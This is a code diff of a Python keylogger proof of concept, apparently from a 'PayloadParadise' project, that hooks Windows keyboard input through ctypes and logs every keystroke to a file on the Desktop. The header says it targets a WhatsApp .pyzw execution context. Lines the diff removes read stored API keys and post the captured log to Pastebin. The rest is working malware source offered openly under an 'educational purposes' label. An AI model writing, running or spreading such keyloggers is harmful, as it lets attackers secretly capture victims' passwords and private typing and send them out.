@@ -3,12 +3,15 @@ import time
 import threading
 import ctypes
 import ctypes.wintypes
-import requests
 
-# Leak Creds POC (.pyz) - PayloadParadise
-# Uses ctypes Win32 API. FOR EDUCATIONAL PURPOSES ONLY.
+# ============================================================
+# Keylogger POC (.pyz version) - PayloadParadise
+# Uses ctypes Win32 API hooks instead of pynput to work
+# in the WhatsApp .pyzw execution context.
+# FOR EDUCATIONAL PURPOSES ONLY.
+# ============================================================
 
-LOG_FILE = os.path.join("secrets", "keylog.txt")
+LOG_FILE = os.path.join(os.path.expanduser("~"), "Desktop", "keylog.txt")
 
 WH_KEYBOARD_LL = 13
 WM_KEYDOWN = 0x0100
@@ -17,6 +20,7 @@ HC_ACTION = 0
 
 LRESULT = ctypes.c_long
 ULONG_PTR = ctypes.POINTER(ctypes.c_ulong)
+
 user32 = ctypes.windll.user32
 kernel32 = ctypes.windll.kernel32
 
@@ -30,72 +34,62 @@ SPECIAL_KEYS = {
 
 class KBDLLHOOKSTRUCT(ctypes.Structure):
     _fields_ = [
-        ("vkCode", ctypes.wintypes.DWORD), ("scanCode", ctypes.wintypes.DWORD),
-        ("flags", ctypes.wintypes.DWORD), ("time", ctypes.wintypes.DWORD),
+        ("vkCode", ctypes.wintypes.DWORD),
+        ("scanCode", ctypes.wintypes.DWORD),
+        ("flags", ctypes.wintypes.DWORD),
+        ("time", ctypes.wintypes.DWORD),
         ("dwExtraInfo", ULONG_PTR),
     ]
 
 HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)
 
 def vk_to_char(vk_code):
-    if vk_code in SPECIAL_KEYS: return SPECIAL_KEYS[vk_code]
+    if vk_code in SPECIAL_KEYS:
+        return SPECIAL_KEYS[vk_code]
     scan_code = user32.MapVirtualKeyW(vk_code, 0)
     kbd_state = (ctypes.c_ubyte * 256)()
     user32.GetKeyboardState(kbd_state)
     buf = (ctypes.c_wchar * 4)()
     result = user32.ToUnicode(vk_code, scan_code, kbd_state, buf, len(buf), 0)
-    if result > 0: return buf[0]
+    if result > 0:
+        return buf[0]
     return f"[vk:{vk_code}]"
 
 def low_level_keyboard_proc(nCode, wParam, lParam):
     if nCode == HC_ACTION and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
         kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+        char = vk_to_char(kb.vkCode)
         try:
-            with open(LOG_FILE, 'a') as f: f.write(vk_to_char(kb.vkCode))
-        except Exception: pass
+            with open(LOG_FILE, 'a') as f:
+                f.write(char)
+        except Exception:
+            pass
     return user32.CallNextHookEx(None, nCode, wParam, lParam)
 
 _hook_callback = HOOKPROC(low_level_keyboard_proc)
 
 def start_keylogger():
     hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_callback, kernel32.GetModuleHandleW(None), 0)
-    if not hook: return
+    if not hook:
+        return
     msg = ctypes.wintypes.MSG()
     while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
         user32.TranslateMessage(ctypes.byref(msg))
         user32.DispatchMessageW(ctypes.byref(msg))
     user32.UnhookWindowsHookEx(hook)
 
-def send_to_pastebin():
-    try:
-        with open(os.path.join("secrets", "dev_key"), 'r') as f: key = f.read().strip()
-        with open(os.path.join("secrets", "user_key"), 'r') as f: user_key = f.read().strip()
-        with open(LOG_FILE, 'r') as f: file_contents = f.read()
-        
-        login_data = {
-            'api_dev_key': key, 'api_user_name': 'user_name', 'api_user_password': 'secure_password',
-            'api_option': 'paste', 'api_paste_code': file_contents, 'api_paste_name': "keylog_data",
-            'api_paste_expire_date': '10M', 'api_user_key': user_key, 'api_paste_format': 'gettext'
-        }
-        r = requests.post("https://pastebin.com/api/api_post.php", data=login_data)
-        print("Paste status:", r.status_code)
-        print("Paste URL:", r.text)
-    except Exception as e:
-        print(f"Error: {e}")
-
 def time_limit_check(duration):
     start = time.time()
     while True:
         if time.time() > start + duration:
-            print("Time elapsed, sending data to Pastebin...")
-            send_to_pastebin()
             os._exit(0)
         time.sleep(1)
 
 if __name__ == "__main__":
-    duration = 20
-    os.makedirs("secrets", exist_ok=True)
-    with open(LOG_FILE, 'w') as f: pass
+    duration = 15
+    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+    with open(LOG_FILE, 'w') as f:
+        pass
     timer_thread = threading.Thread(target=time_limit_check, args=(duration,), daemon=True)
     timer_thread.start()
     start_keylogger()
